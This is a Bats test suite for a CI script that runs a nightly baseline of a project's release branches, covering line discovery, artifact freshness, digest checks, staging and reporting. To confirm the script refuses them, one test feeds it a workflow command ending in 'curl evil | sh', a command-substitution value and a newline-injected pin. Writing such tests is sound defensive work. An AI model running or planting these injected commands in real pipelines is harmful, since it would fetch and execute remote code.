#!/usr/bin/env bats
# Tests for hack/release-baseline.sh, the nightly baseline of the release
# lines, and for the jobs of .github/workflows/nightly.yaml that run it.
#
# The registry is stubbed through skopeo and flux on PATH: a reference
# resolves to the file under $STUB_REG named after its tag or digest, a
# reference with no file answers "manifest unknown", and $STUB_REG_ERROR makes
# every read fail the way an unreachable registry does. backport-batch is
# stubbed through BACKPORT_BATCH and prints $STUB_LINES.
#
# Run with: bats hack/release-baseline.bats

load test_helper
# run --separate-stderr keeps a refusal's message out of $output, so a test
# can assert that nothing reached stdout.
bats_require_minimum_version 1.5.0

SCRIPT="${BATS_TEST_DIRNAME}/release-baseline.sh"
NIGHTLY="${BATS_TEST_DIRNAME}/../.github/workflows/nightly.yaml"
BUILD_RELEASE="${BATS_TEST_DIRNAME}/../.github/workflows/build-release.yaml"

setup() {
  strict_setup
  export TMPDIR="$BATS_TEST_TMPDIR"
  export REGISTRY=registry.example/cozystack
  export GIT_CONFIG_GLOBAL="$BATS_TEST_TMPDIR/gitconfig"
  export GIT_CONFIG_NOSYSTEM=1
  git config --global user.name test
  git config --global user.email test@example.com
  git config --global init.defaultBranch main

  stubs="$BATS_TEST_TMPDIR/bin"
  mkdir -p "$stubs"
  export PATH="$stubs:$PATH"
  export STUB_REG="$BATS_TEST_TMPDIR/registry"
  mkdir -p "$STUB_REG"
  unset STUB_REG_ERROR
  cat > "$stubs/skopeo" <<'EOF'
#!/usr/bin/env bash
case "$1" in
  inspect)
    if [ -n "${STUB_REG_ERROR:-}" ]; then
      echo "pinging container registry: connection refused" >&2
      exit 1
    fi
    ref=${3#docker://}
    name=${ref##*/cozystack-packages}
    name=${name#[:@]}
    if [ ! -f "$STUB_REG/$name" ]; then
      echo "reading manifest $name: manifest unknown" >&2
      exit 2
    fi
    cat "$STUB_REG/$name"
    ;;
  manifest-digest)
    echo "sha256:$(sha256sum "$2" | cut -d' ' -f1)"
    ;;
  *) echo "skopeo stub: unexpected $*" >&2; exit 2 ;;
esac
EOF
  cat > "$stubs/flux" <<'EOF'
#!/usr/bin/env bash
# flux pull artifact oci://<registry>/cozystack-packages@<digest> --output <dir>
[ "$1 $2" = "pull artifact" ] || { echo "flux stub: unexpected $*" >&2; exit 2; }
echo "$3" >> "$STUB_REG/pulls"
cp -r "$STUB_REG/tree/." "$5/"
EOF
  export BACKPORT_BATCH="$stubs/backport-batch"
  cat > "$BACKPORT_BATCH" <<'EOF'
#!/usr/bin/env bash
[ "$1" = lines ] || exit 2
printf '%s' "$STUB_LINES"
exit "${STUB_LINES_RC:-0}"
EOF
  chmod +x "$stubs/skopeo" "$stubs/flux" "$BACKPORT_BATCH"
  export STUB_LINES=$'release-1.7\nrelease-1.6\n'
  unset STUB_LINES_RC

  # One upstream with main and three lines; the work tree is a clone, so the
  # lines are remote-tracking refs exactly as after `backport-batch lines`
  # fetched them.
  upstream="$BATS_TEST_TMPDIR/upstream.git"
  src="$BATS_TEST_TMPDIR/src"
  git init -q --bare "$upstream"
  git init -q "$src"
  mkdir -p "$src/.github/workflows" "$src/docs" "$src/packages/core/installer"
  cat > "$src/.github/workflows/build-release.yaml" <<'EOF'
on:
  push:
    branches: ['release-[0-9]+.[0-9]+']
    paths-ignore:
      - 'docs/**'
EOF
  printf 'cozystackOperator:\n  platformSourceUrl: oci://ghcr.io/x\n  platformSourceRef: digest=sha256:old\n' \
    > "$src/packages/core/installer/values.yaml"
  write_pr_workflow_17 "$src"
  echo base > "$src/README"
  git -C "$src" add -A
  git -C "$src" commit -q -m base
  for l in 1.6 1.7 1.8; do
    git -C "$src" branch "release-$l"
  done
  git -C "$src" checkout -q release-1.6
  write_pr_workflow_16 "$src"
  git -C "$src" commit -q -am "1.6 lane"
  git -C "$src" checkout -q main
  git -C "$src" push -q "$upstream" main release-1.6 release-1.7 release-1.8
  export REPO="$BATS_TEST_TMPDIR/repo"
  git clone -q "$upstream" "$REPO"
  cd "$REPO"
}

# The checks job of release-1.7 and later: pinned tools, envtest, -j4 -k, and
# a docs-only step that must not be picked.
write_pr_workflow_17() {
  cat > "$1/.github/workflows/pull-requests.yaml" <<'EOF'
jobs:
  checks:
    env:
      GOPROXY: "https://proxy.golang.org|direct"
    steps:
      - name: Set up test toolchain
        env:
          CODE_CHANGED: ${{ needs.plan.outputs.code }}
          HELM_UNITTEST_VERSION: "1.1.2"
          BATS_VERSION: "1.14.0"
          BATS_COMMIT: eb7f42f8d608ac693d7a4b67474f6714ea68cfc5
        run: |
          echo install
      - name: Run unit and controller tests
        if: needs.plan.outputs.code == 'true'
        run: make unit-tests test-controllers test-controllers-envtest -j4 -k --output-sync=target
      - name: Run Bats unit tests for docs-only changes
        if: needs.plan.outputs.code == 'false'
        run: make bats-unit-tests
EOF
}

# The checks job of release-1.6: unpinned plugin, no envtest, two steps.
write_pr_workflow_16() {
  cat > "$1/.github/workflows/pull-requests.yaml" <<'EOF'
jobs:
  checks:
    steps:
      - name: Set up test toolchain
        run: |
          helm plugin list 2>/dev/null | grep -q unittest \
            || helm plugin install https://github.com/helm-unittest/helm-unittest
      - name: Run unit tests
        run: make unit-tests
      - name: Run controller Go tests
        run: make test-controllers
EOF
}

# Publishes cozystack-packages:<tag> built from <sha> and prints its digest.
publish() {
  local tag=$1 sha=$2 file digest
  file="$STUB_REG/$tag"
  printf '{"annotations":{"org.opencontainers.image.revision":"v1.0.0-5-gabc:%s"}}\n' "$sha" > "$file"
  digest="sha256:$(sha256sum "$file" | cut -d' ' -f1)"
  cp "$file" "$STUB_REG/$digest"
  echo "$digest"
}

# Commits one change on a line upstream and refreshes the clone's view of it.
advance() {
  local line=$1 path=$2
  git -C "$src" checkout -q "$line"
  mkdir -p "$src/$(dirname "$path")"
  echo "$RANDOM$RANDOM" >> "$src/$path"
  git -C "$src" add -A
  git -C "$src" commit -q -m "change $path"
  git -C "$src" push -q "$upstream" "$line"
  git -C "$src" checkout -q main
  git -C "$REPO" fetch -q origin
}

head_of() {
  git -C "$REPO" rev-parse "refs/remotes/origin/$1"
}

# ── discover ──────────────────────────────────────────────────────────────

@test "discover pins every line backport-batch lines prints to its head on origin" {
  publish release-1.7 "$(head_of release-1.7)" > /dev/null
  run --separate-stderr "$SCRIPT" discover
  [ "$status" -eq 0 ]
  [ "$(jq -r 'map(.line) | join(" ")' <<<"$output")" = "release-1.7 release-1.6" ]
  [ "$(jq -r '.[0].sha' <<<"$output")" = "$(head_of release-1.7)" ]
  [ "$(jq -r '.[1].sha' <<<"$output")" = "$(head_of release-1.6)" ]
  jq -e 'all(.[]; .sha | test("^[0-9a-f]{40}$"))' <<<"$output" > /dev/null
}

@test "a line in its rc window joins the matrix, and a retired line leaves it" {
  export STUB_LINES=$'release-1.8\nrelease-1.7\nrelease-1.6\n'
  run --separate-stderr "$SCRIPT" discover
  [ "$status" -eq 0 ]
  [ "$(jq -r 'map(.line) | join(" ")' <<<"$output")" = "release-1.8 release-1.7 release-1.6" ]

  export STUB_LINES=$'release-1.8\nrelease-1.7\n'
  run --separate-stderr "$SCRIPT" discover
  [ "$status" -eq 0 ]
  [ "$(jq -r 'map(.line) | join(" ")' <<<"$output")" = "release-1.8 release-1.7" ]
}

@test "the matrix keeps the SHA it pinned when the line moves afterwards" {
  run --separate-stderr "$SCRIPT" discover
  [ "$status" -eq 0 ]
  pinned=$(jq -r '.[] | select(.line == "release-1.7") | .sha' <<<"$output")
  advance release-1.7 packages/x
  [ "$pinned" != "$(head_of release-1.7)" ]
  # What later jobs read is the emitted matrix, not the branch.
  [ "$(jq -r '.[] | select(.line == "release-1.7") | .sha' <<<"$output")" = "$pinned" ]
}

@test "empty lines output makes discovery red with no matrix" {
  export STUB_LINES=''
  run --separate-stderr "$SCRIPT" discover
  [ "$status" -ne 0 ]
  [ -z "$output" ]
  [[ "$stderr" == *"no line"* ]]
}

@test "a token that is not a release-X.Y line makes discovery red" {
  for bad in $'release-1.7\nmain\n' $'release-1.7\n\nrelease-1.6\n' $'release-1.7 release-1.6\n' $'release-1.6.1\n' $'Release-1.7\n'; do
    export STUB_LINES="$bad"
    run --separate-stderr "$SCRIPT" discover
    [ "$status" -ne 0 ] || { echo "accepted: $(printf '%q' "$bad")"; false; }
    [ -z "$output" ]
  done
}

@test "a failing backport-batch lines makes discovery red even when it printed lines" {
  export STUB_LINES_RC=1
  run --separate-stderr "$SCRIPT" discover
  [ "$status" -ne 0 ]
  [ -z "$output" ]
}

@test "a line with no head on origin makes discovery red" {
  export STUB_LINES=$'release-1.7\nrelease-1.9\n'
  run --separate-stderr "$SCRIPT" discover
  [ "$status" -ne 0 ]
  [ -z "$output" ]
  [[ "$stderr" == *release-1.9* ]]
}

@test "a line listed twice makes discovery red" {
  export STUB_LINES=$'release-1.7\nrelease-1.7\n'
  run --separate-stderr "$SCRIPT" discover
  [ "$status" -ne 0 ]
  [ -z "$output" ]
}

# ── artifact freshness ────────────────────────────────────────────────────

@test "an artifact built from the pinned SHA is fresh" {
  sha=$(head_of release-1.7)
  digest=$(publish release-1.7 "$sha")
  run --separate-stderr "$SCRIPT" artifact release-1.7 "$sha"
  [ "$status" -eq 0 ]
  [ "$output" = "state=fresh
digest=$digest
revision=$sha" ]
}

@test "an artifact built from an ancestor that differs only under docs/ is fresh" {
  old=$(head_of release-1.7)
  digest=$(publish release-1.7 "$old")
  advance release-1.7 docs/a/b.md
  advance release-1.7 docs/c.md
  run --separate-stderr "$SCRIPT" artifact release-1.7 "$(head_of release-1.7)"
  [ "$status" -eq 0 ]
  [ "$(sed -n 1p <<<"$output")" = state=fresh ]
  [ "$(sed -n 2p <<<"$output")" = "digest=$digest" ]
  [ "$(sed -n 3p <<<"$output")" = "revision=$old" ]
}

@test "an artifact built from an ancestor with a change outside docs/ is stale" {
  old=$(head_of release-1.7)
  publish release-1.7 "$old" > /dev/null
  advance release-1.7 docs/a.md
  advance release-1.7 packages/core/x.yaml
  run --separate-stderr "$SCRIPT" artifact release-1.7 "$(head_of release-1.7)"
  [ "$status" -eq 0 ]
  [ "$(sed -n 1p <<<"$output")" = state=stale ]
}

@test "a file renamed out of a code path into docs/ keeps the artifact stale" {
  old=$(head_of release-1.7)
  publish release-1.7 "$old" > /dev/null
  git -C "$src" checkout -q release-1.7
  git -C "$src" mv README docs/README
  git -C "$src" commit -q -m "move README"
  git -C "$src" push -q "$upstream" release-1.7
  git -C "$src" checkout -q main
  git fetch -q origin
  run --separate-stderr "$SCRIPT" artifact release-1.7 "$(head_of release-1.7)"
  [ "$status" -eq 0 ]
  [ "$(sed -n 1p <<<"$output")" = state=stale ]
}

@test "a docs/ path the line's build-release does not ignore keeps the artifact stale" {
  old=$(head_of release-1.7)
  publish release-1.7 "$old" > /dev/null
  git -C "$src" checkout -q release-1.7
  yq -i '.on.push["paths-ignore"] = ["docs/*.md"]' "$src/.github/workflows/build-release.yaml"
  mkdir -p "$src/docs/sub"
  echo x > "$src/docs/sub/page.md"
  git -C "$src" add -A
  git -C "$src" commit -q -m "narrow the filter"
  git -C "$src" push -q "$upstream" release-1.7
  git -C "$src" checkout -q main
  git fetch -q origin
  run --separate-stderr "$SCRIPT" artifact release-1.7 "$(head_of release-1.7)"
  [ "$status" -eq 0 ]
  [ "$(sed -n 1p <<<"$output")" = state=stale ]
}

@test "an artifact built from a commit that is not an ancestor is stale" {
  publish release-1.7 "$(head_of release-1.6)" > /dev/null
  run --separate-stderr "$SCRIPT" artifact release-1.7 "$(head_of release-1.7)"
  [ "$status" -eq 0 ]
  [ "$(sed -n 1p <<<"$output")" = state=stale ]
}

@test "an artifact from a commit off the line is stale even when only docs/ differ" {
  git -C "$src" checkout -q -b side release-1.7
  echo side > "$src/docs/side.md"
  git -C "$src" add -A
  git -C "$src" commit -q -m "docs on a side branch"
  git -C "$src" push -q "$upstream" side
  git -C "$src" checkout -q main
  git fetch -q origin
  publish release-1.7 "$(head_of side)" > /dev/null
  run --separate-stderr "$SCRIPT" artifact release-1.7 "$(head_of release-1.7)"
  [ "$status" -eq 0 ]
  [ "$(sed -n 1p <<<"$output")" = state=stale ]
}

@test "an artifact whose revision is a ref rather than a commit is stale" {
  for rev in origin/release-1.7 release-1.7 HEAD; do
    publish release-1.7 "$rev" > /dev/null
    run --separate-stderr "$SCRIPT" artifact release-1.7 "$(head_of release-1.7)"
    [ "$status" -eq 0 ]
    [ "$(sed -n 1p <<<"$output")" = state=stale ] || { echo "fresh for revision $rev"; false; }
  done
}

@test "an artifact whose revision names no known commit is stale" {
  publish release-1.7 0123456789abcdef0123456789abcdef01234567 > /dev/null
  run --separate-stderr "$SCRIPT" artifact release-1.7 "$(head_of release-1.7)"
  [ "$status" -eq 0 ]
  [ "$(sed -n 1p <<<"$output")" = state=stale ]
}

@test "a missing artifact reads as missing" {
  run --separate-stderr "$SCRIPT" artifact release-1.6 "$(head_of release-1.6)"
  [ "$status" -eq 0 ]
  [ "$output" = "state=missing
digest=
revision=" ]
}

@test "a registry error is not mistaken for a missing artifact" {
  publish release-1.7 "$(head_of release-1.7)" > /dev/null
  export STUB_REG_ERROR=1
  run --separate-stderr "$SCRIPT" artifact release-1.7 "$(head_of release-1.7)"
  [ "$status" -ne 0 ]
  [ -z "$output" ]
  run --separate-stderr "$SCRIPT" discover
  [ "$status" -ne 0 ]
  [ -z "$output" ]
}

@test "discover records each line's artifact state and digest" {
  digest=$(publish release-1.7 "$(head_of release-1.7)")
  run --separate-stderr "$SCRIPT" discover
  [ "$status" -eq 0 ]
  [ "$(jq -r '.[] | select(.line == "release-1.7") | "\(.state) \(.digest)"' <<<"$output")" = "fresh $digest" ]
  [ "$(jq -r '.[] | select(.line == "release-1.6") | "\(.state) \(.digest)"' <<<"$output")" = "missing " ]
}

# ── verify and stage ──────────────────────────────────────────────────────

@test "verify accepts the digest of an artifact built from the pinned SHA" {
  sha=$(head_of release-1.6)
  digest=$(publish release-1.6 "$sha")
  run --separate-stderr "$SCRIPT" verify "$digest" "$sha"
  [ "$status" -eq 0 ]
}

@test "verify refuses a digest built from another commit" {
  digest=$(publish release-1.6 "$(head_of release-1.7)")
  run --separate-stderr "$SCRIPT" verify "$digest" "$(head_of release-1.6)"
  [ "$status" -ne 0 ]
  [[ "$stderr" == *"$(head_of release-1.7)"* ]]
}

@test "verify refuses a manifest whose bytes are not the digest it asked for" {
  sha=$(head_of release-1.6)
  digest=$(publish release-1.6 "$sha")
  printf '{"annotations":{"org.opencontainers.image.revision":"x:%s"},"other":1}\n' "$sha" > "$STUB_REG/$digest"
  run --separate-stderr "$SCRIPT" verify "$digest" "$sha"
  [ "$status" -ne 0 ]
}

@test "verify refuses a digest the registry does not have, and a malformed one" {
  run --separate-stderr "$SCRIPT" verify "sha256:$(printf '%064d' 0)" "$(head_of release-1.6)"
  [ "$status" -ne 0 ]
  run --separate-stderr "$SCRIPT" verify "release-1.6" "$(head_of release-1.6)"
  [ "$status" -ne 0 ]
  run --separate-stderr "$SCRIPT" verify "" "$(head_of release-1.6)"
  [ "$status" -ne 0 ]
}

@test "stage overlays the artifact's tree by digest and pins the installer to it" {
  digest=$(publish release-1.7 "$(head_of release-1.7)")
  mkdir -p "$STUB_REG/tree/core/installer" "$STUB_REG/tree/core/testing"
  printf 'cozystackOperator:\n  image: built\n  platformSourceUrl: x\n  platformSourceRef: y\n' > "$STUB_REG/tree/core/installer/values.yaml"
  echo 'e2e: {image: line-sandbox}' > "$STUB_REG/tree/core/testing/values.yaml"
  run --separate-stderr "$SCRIPT" stage "$digest"
  [ "$status" -eq 0 ]
  [ "$(cat "$STUB_REG/pulls")" = "oci://$REGISTRY/cozystack-packages@$digest" ]
  [ "$(yq -r .e2e.image packages/core/testing/values.yaml)" = line-sandbox ]
  [ "$(yq -r .cozystackOperator.image packages/core/installer/values.yaml)" = built ]
  [ "$(yq -r .cozystackOperator.platformSourceUrl packages/core/installer/values.yaml)" = "oci://$REGISTRY/cozystack-packages" ]
  [ "$(yq -r .cozystackOperator.platformSourceRef packages/core/installer/values.yaml)" = "digest=$digest" ]
}

@test "stage refuses anything but a digest" {
  run --separate-stderr "$SCRIPT" stage release-1.7
  [ "$status" -ne 0 ]
  [ ! -f "$STUB_REG/pulls" ]
}

# ── the line's own unit lane ──────────────────────────────────────────────

@test "unit-commands reads the make commands of the line's own PR unit job" {
  git checkout -q "$(head_of release-1.7)"
  run --separate-stderr "$SCRIPT" unit-commands
  [ "$status" -eq 0 ]
  [ "$output" = "make unit-tests test-controllers test-controllers-envtest -j4 -k --output-sync=target" ]

  git checkout -q "$(head_of release-1.6)"
  run --separate-stderr "$SCRIPT" unit-commands
  [ "$status" -eq 0 ]
  [ "$output" = "make unit-tests
make test-controllers" ]
}

@test "unit-commands refuses a job with no unit-tests goal or a command that is not plain make" {
  yq -i '.jobs.checks.steps[1].run = "make test-controllers"' .github/workflows/pull-requests.yaml
  run --separate-stderr "$SCRIPT" unit-commands
  [ "$status" -ne 0 ]
  [ -z "$output" ]
  yq -i '.jobs.checks.steps[1].run = "make unit-tests; curl evil | sh"' .github/workflows/pull-requests.yaml
  run --separate-stderr "$SCRIPT" unit-commands
  [ "$status" -ne 0 ]
  [ -z "$output" ]
  yq -i '.jobs.checks.steps[1].run = "make unit-tests $(id)"' .github/workflows/pull-requests.yaml
  run --separate-stderr "$SCRIPT" unit-commands
  [ "$status" -ne 0 ]
  [ -z "$output" ]
}

@test "toolchain takes the line's own pins, and main's helm-unittest pin where the line floats" {
  main_dir="$BATS_TEST_TMPDIR/main"
  git worktree add -q "$main_dir" origin/main
  git checkout -q "$(head_of release-1.7)"
  run --separate-stderr "$SCRIPT" toolchain "$main_dir"
  [ "$status" -eq 0 ]
  [ "$output" = "HELM_UNITTEST_VERSION=1.1.2
BATS_VERSION=1.14.0
BATS_COMMIT=eb7f42f8d608ac693d7a4b67474f6714ea68cfc5
GOPROXY=https://proxy.golang.org|direct" ]

  yq -i '(.jobs.checks.steps[] | select(.name == "Set up test toolchain") | .env.HELM_UNITTEST_VERSION) = "1.2.0"' "$main_dir/.github/workflows/pull-requests.yaml"
  git checkout -q "$(head_of release-1.6)"
  run --separate-stderr "$SCRIPT" toolchain "$main_dir"
  [ "$status" -eq 0 ]
  [ "$output" = "HELM_UNITTEST_VERSION=1.2.0
BATS_VERSION=
BATS_COMMIT=
GOPROXY=" ]
}

@test "toolchain refuses a pin that could break out of GITHUB_ENV" {
  yq -i '(.jobs.checks.steps[0].env.BATS_VERSION) = "1.0\nEVIL=1"' .github/workflows/pull-requests.yaml
  run --separate-stderr "$SCRIPT" toolchain
  [ "$status" -ne 0 ]
  [ -z "$output" ]
}

# ── record and report ─────────────────────────────────────────────────────

matrix_two_lines() {
  printf '[{"line":"release-1.7","sha":"%s","state":"fresh","digest":"sha256:%s"},{"line":"release-1.6","sha":"%s","state":"missing","digest":""}]\n' \
    "$(printf '%040d' 7)" "$(printf '%064d' 7)" "$(printf '%040d' 6)" > "$BATS_TEST_TMPDIR/matrix.json"
}

junit() {
  printf '<testsuites><testsuite>%s</testsuite></testsuites>\n' "$(for _ in $(seq "$1"); do printf '<testcase name="t"/>'; done)" > "$2"
}

record_all_green() {
  mkdir -p "$BATS_TEST_TMPDIR/results"
  junit 3 "$BATS_TEST_TMPDIR/report.xml"
  for l in 1.7 1.6; do
    "$SCRIPT" record "$BATS_TEST_TMPDIR/results/unit-release-$l.env" kind=unit "line=release-$l" result=success
    "$SCRIPT" record "$BATS_TEST_TMPDIR/results/e2e-release-$l.env" kind=e2e "line=release-$l" result=success \
      "digest=sha256:$(printf '%064d' 1)" rebuilt=false "junit=$BATS_TEST_TMPDIR/report.xml"
  done
}

@test "record counts the test cases of the junit report it is given" {
  junit 4 "$BATS_TEST_TMPDIR/r.xml"
  run "$SCRIPT" record "$BATS_TEST_TMPDIR/out.env" kind=e2e line=release-1.7 result=success "junit=$BATS_TEST_TMPDIR/r.xml"
  [ "$status" -eq 0 ]
  grep -qx 'tests=4' "$BATS_TEST_TMPDIR/out.env"
  run "$SCRIPT" record "$BATS_TEST_TMPDIR/none.env" kind=e2e line=release-1.7 result=success "junit=$BATS_TEST_TMPDIR/absent.xml"
  [ "$status" -eq 0 ]
  grep -qx 'tests=0' "$BATS_TEST_TMPDIR/none.env"
  run "$SCRIPT" record "$BATS_TEST_TMPDIR/bad.env" kind=e2e $'line=release-1.7\nresult=success'
  [ "$status" -ne 0 ]
}

@test "report is green only when every line's unit and e2e passed" {
  matrix_two_lines
  record_all_green
  run --separate-stderr "$SCRIPT" report "$BATS_TEST_TMPDIR/matrix.json" "$BATS_TEST_TMPDIR/results"
  [ "$status" -eq 0 ]
  [[ "$output" == *"release-1.7"* ]]
  [[ "$output" == *"release-1.6"* ]]
  [[ "$output" == *"$(printf '%040d' 6)"* ]]
}

@test "a failed unit on one line makes the report red and still reports the other line" {
  matrix_two_lines
  record_all_green
  "$SCRIPT" record "$BATS_TEST_TMPDIR/results/unit-release-1.6.env" kind=unit line=release-1.6 result=failure
  run --separate-stderr "$SCRIPT" report "$BATS_TEST_TMPDIR/matrix.json" "$BATS_TEST_TMPDIR/results"
  [ "$status" -eq 1 ]
  [[ "$output" == *"release-1.7"* ]]
  [[ "$output" == *failure* ]]
}

@test "a missing result makes the report red" {
  for missing in unit-release-1.7 e2e-release-1.6; do
    matrix_two_lines
    rm -rf "$BATS_TEST_TMPDIR/results"
    record_all_green
    rm "$BATS_TEST_TMPDIR/results/$missing.env"
    run --separate-stderr "$SCRIPT" report "$BATS_TEST_TMPDIR/matrix.json" "$BATS_TEST_TMPDIR/results"
    [ "$status" -eq 1 ] || { echo "green without $missing"; false; }
    [[ "$output" == *"no result"* ]]
  done
}

@test "an e2e that passed with no test cases makes the report red" {
  matrix_two_lines
  record_all_green
  : > "$BATS_TEST_TMPDIR/empty.xml"
  "$SCRIPT" record "$BATS_TEST_TMPDIR/results/e2e-release-1.7.env" kind=e2e line=release-1.7 result=success \
    "digest=sha256:$(printf '%064d' 1)" rebuilt=false "junit=$BATS_TEST_TMPDIR/empty.xml"
  run --separate-stderr "$SCRIPT" report "$BATS_TEST_TMPDIR/matrix.json" "$BATS_TEST_TMPDIR/results"
  [ "$status" -eq 1 ]
}

@test "a report with no lines is red" {
  mkdir -p "$BATS_TEST_TMPDIR/results"
  for m in '[]' '' 'not json'; do
    printf '%s' "$m" > "$BATS_TEST_TMPDIR/matrix.json"
    run --separate-stderr "$SCRIPT" report "$BATS_TEST_TMPDIR/matrix.json" "$BATS_TEST_TMPDIR/results"
    [ "$status" -ne 0 ] || { echo "green for matrix '$m'"; false; }
  done
}

# ── the workflow ──────────────────────────────────────────────────────────

# Prints every job of nightly.yaml with the root it hangs from: mirror for
# main's nightly, discover for the line baseline.
roots() {
  yq -o=json '.jobs | with_entries(.value = ([.value.needs] | flatten | map(select(. != null))))' "$NIGHTLY" \
    | jq -r '
        def root($j; $g): if $j == "mirror" or $j == "discover" then [$j]
          else ([$g[$j][] | root(.; $g)[]] | unique) end;
        . as $g | keys[] | "\(.) \(root(.; $g) | join(","))"'
}

@test "every nightly job hangs from exactly one of main's nightly and the line baseline" {
  run roots
  [ "$status" -eq 0 ]
  bad=$(awk '$2 != "mirror" && $2 != "discover"' <<<"$output")
  [ -z "$bad" ] || { echo "$bad"; false; }
  # A job that overrides the implicit success() must still check its root.
  for job in $(yq -r '.jobs | keys | .[]' "$NIGHTLY"); do
    cond=$(yq -r ".jobs.\"$job\".if // \"\"" "$NIGHTLY")
    case "$cond" in
      *always\(\)* | *cancelled\(\)*)
        root=$(awk -v j="$job" '$1 == j {print $2}' <<<"$output")
        [[ "$cond" == *"needs.$root.result"* ]] || { echo "$job: $cond"; false; } ;;
    esac
  done
}

@test "each guarded root names the cron it belongs to, and the crons are the workflow's" {
  crons=$(yq -r '.on.schedule[].cron' "$NIGHTLY" | sort | tr '\n' ' ')
  [ "$crons" = "0 2 * * * 17 22 * * * " ]
  [[ "$(yq -r .jobs.mirror.if "$NIGHTLY")" == *"github.event.schedule == '0 2 * * *'"* ]]
  [[ "$(yq -r .jobs.mirror.if "$NIGHTLY")" == *"!inputs.release_baseline"* ]]
  [[ "$(yq -r .jobs.discover.if "$NIGHTLY")" == *"github.event.schedule == '17 22 * * *'"* ]]
  [[ "$(yq -r .jobs.discover.if "$NIGHTLY")" == *"&& inputs.release_baseline"* ]]
  for root in mirror discover; do
    [[ "$(yq -r ".jobs.$root.if" "$NIGHTLY")" == *"vars.NIGHTLY_ENABLED == 'true'"* ]]
  done
}

@test "the baseline e2e does not wait on the unit legs, and no leg stops its siblings" {
  needs=$(yq -r '[.jobs.e2e-line.needs[]] | join(" ")' "$NIGHTLY")
  [[ " $needs " != *" unit "* ]]
  for job in unit e2e-line rebuild; do
    [ "$(yq -r ".jobs.\"$job\".strategy.\"fail-fast\"" "$NIGHTLY")" = false ]
  done
}

@test "every step that pipes a baseline command into another sets pipefail" {
  # An unspecified shell is bash -e without pipefail: `report | tee` would read
  # green on a red report.
  # A single | anywhere after the call, continuation lines included; || is not
  # a pipe.
  piped=$(yq -o=json '[.jobs[].steps[]?] | map(select(.run // "" | test("(?s)release-baseline\\.sh.*[^|][|][^|]")))' "$NIGHTLY")
  [ "$(jq '[.[].name] | index("Summarise each line") != null and index("Read the line'"'"'s tool pins") != null' <<<"$piped")" = true ]
  bad=$(jq -r '.[] | select(.run | test("set -(eu)?o pipefail") | not) | .name' <<<"$piped")
  [ -z "$bad" ] || { echo "$bad"; false; }
}

@test "a called build-release never cancels a push build, and publishes only the line's head" {
  [ "$(yq -r '.concurrency."cancel-in-progress"' "$BUILD_RELEASE")" = '${{ !inputs.line }}' ]
  step=$(yq -r '.jobs.build-line.steps[] | select(.name == "Refuse a commit that is not the line'"'"'s head") | .run' "$BUILD_RELEASE")
  [[ "$step" == *'git rev-parse "refs/remotes/origin/$LINE"'* ]]
  [[ "$step" == *'[ "$head" != "$SHA" ]'* ]]
}

@test "a called build-release keys its concurrency on the line and builds the pinned SHA" {
  [ "$(yq -r .concurrency.group "$BUILD_RELEASE")" = 'build-release-${{ inputs.line || github.ref_name }}' ]
  [ "$(yq -r '.jobs.build-line.steps[] | select(.uses // "" | test("^actions/checkout@")) | .with.ref' "$BUILD_RELEASE")" = '${{ inputs.sha }}' ]
  [ "$(yq -r '.jobs.build-line.steps[] | select(.run == "make build") | .env.IMAGE_TAG' "$BUILD_RELEASE")" = '${{ inputs.line || github.ref_name }}' ]
}
